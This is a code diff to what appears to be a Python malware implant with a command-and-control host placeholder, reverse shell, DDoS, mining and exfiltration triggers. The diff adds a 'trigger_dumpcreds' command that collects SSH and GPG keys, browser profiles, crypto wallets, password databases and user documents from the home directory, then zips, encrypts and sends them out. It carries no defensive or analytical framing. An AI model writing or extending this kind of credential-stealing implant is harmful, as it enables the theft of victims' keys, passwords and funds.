@@ -5,7 +5,7 @@ from Cryptodome.Random import get_random_bytes
 import zipfile, tempfile, shutil, sys
 
 SECRET_KEY = b'Sixteen byte key'
-EXFIL_KEY = b'TrinityRogueKey!'  # 16 bytes AES key
+EXFIL_KEY = b'TrinityRogueKey!'
 C2_HOST = 'YOUR.C2.IP.HERE'
 C2_PORT = 4444
 EXFIL_PORT = 9090
@@ -40,18 +40,26 @@ def run_payload(name):
     else:
         return f"[!] Payload {name} not found."
 
-def zip_directory(path):
-    zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        if os.path.isdir(path):
-            for root, _, files in os.walk(path):
-                for file in files:
-                    full_path = os.path.join(root, file)
-                    arcname = os.path.relpath(full_path, start=path)
-                    zipf.write(full_path, arcname)
-        else:
-            zipf.write(path, arcname=os.path.basename(path))
-    return zip_path
+def zip_directory(path, zipf=None, base=""):
+    if zipf is None:
+        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
+        zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
+        should_close = True
+    else:
+        should_close = False
+
+    if os.path.isdir(path):
+        for root, _, files in os.walk(path):
+            for file in files:
+                full_path = os.path.join(root, file)
+                arcname = os.path.join(base, os.path.relpath(full_path, path))
+                zipf.write(full_path, arcname)
+    elif os.path.isfile(path):
+        zipf.write(path, arcname=os.path.join(base, os.path.basename(path)))
+
+    if should_close:
+        zipf.close()
+        return zip_path
 
 def encrypt_file(path):
     with open(path, 'rb') as f:
@@ -62,7 +70,14 @@ def encrypt_file(path):
 
 def exfiltrate_data(path):
     try:
-        zip_path = zip_directory(path)
+        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            if isinstance(path, list):
+                for p in path:
+                    zip_directory(p, zipf, base=os.path.basename(p))
+            else:
+                zip_directory(path, zipf)
+
         encrypted_blob = encrypt_file(zip_path)
         os.remove(zip_path)
 
@@ -91,6 +106,28 @@ def handle_trigger(cmd):
         if len(parts) != 2:
             return "[!] Usage: trigger_exfil /path/to/target"
         return exfiltrate_data(parts[1])
+
+    elif cmd == "trigger_dumpcreds":
+        targets = [
+            os.path.expanduser("~/Documents"),
+            os.path.expanduser("~/Downloads"),
+            os.path.expanduser("~/Pictures"),
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/.mozilla"),
+            os.path.expanduser("~/.ssh"),
+            os.path.expanduser("~/.gnupg"),
+            os.path.expanduser("~/.config/google-chrome"),
+            os.path.expanduser("~/.config/BraveSoftware"),
+            os.path.expanduser("~/.wallets"),
+        ]
+
+        # Optional: wildcard grep for .kdbx, .sqlite, .json, .zip
+        home = os.path.expanduser("~")
+        for root, _, files in os.walk(home):
+            for file in files:
+                if file.endswith(('.kdbx', '.sqlite', '.db', '.bak', '.zip', '.csv', '.json')):
+                    targets.append(os.path.join(root, file))
+        return exfiltrate_data(targets)
 
     return None
 
@@ -121,7 +158,7 @@ def handle_command(cmd):
         _, name = cmd.split()
         return run_payload(name)
 
-    elif cmd.startswith("trigger_ddos") or cmd == "trigger_mine" or cmd.startswith("trigger_exfil"):
+    elif cmd.startswith("trigger_"):
         return handle_trigger(cmd) or "[!] Trigger failed"
 
     elif cmd == "reverse_shell":
